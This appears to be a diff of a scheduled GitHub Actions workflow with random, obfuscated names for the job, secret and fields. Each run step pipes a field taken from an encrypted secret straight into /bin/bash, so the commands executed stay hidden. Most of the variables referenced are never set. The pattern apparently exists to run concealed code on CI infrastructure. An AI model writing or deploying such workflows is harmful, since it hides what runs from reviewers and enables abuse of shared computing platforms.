@@ -2,27 +2,22 @@ name: wuhaoning3214
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
-jobs:  # 7429
+    - cron: '8 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          gqd54: ${{ secrets.gqd54 }}
+          xxkzv9: ${{ secrets.xxkzv9 }}
         run: |
-          echo $gqd54 | jq -r .ru7 | /bin/bash
-          echo $fo4 | jq -r .jye62 | /bin/bash
-          echo $ifs52 | jq -r .swto744 | /bin/bash
-          echo $zohg8 | jq -r .sabbs28 | /bin/bash
-          echo $e38432 | jq -r .zw5 | /bin/bash
-          echo $oh3336 | jq -r .lti55772 | /bin/bash
-          echo $qxv47 | jq -r .irzh64 | /bin/bash
-          echo $el2457 | jq -r .u98618 | /bin/bash
-          echo $iej424 | jq -r .ylhpv8342 | /bin/bash
-          echo $dur44 | jq -r .vgxw305 | /bin/bash
-          echo $oz6073 | jq -r .u15098 | /bin/bash
-          echo $nvb98563 | jq -r .jcjs83925 | /bin/bash
+          echo $xxkzv9 | jq -r .ucy453 | /bin/bash
+          echo $mi05030 | jq -r .oymms65 | /bin/bash
+          echo $o4 | jq -r .xaqrq61 | /bin/bash
+          echo $h4 | jq -r .urzq36 | /bin/bash
+          echo $ug5112 | jq -r .jerkq2 | /bin/bash
+          echo $xtx19050 | jq -r .a21 | /bin/bash
+          echo $o76 | jq -r .rfp75862 | /bin/bash
+          echo $htokx51157 | jq -r .qr5 | /bin/bash
 
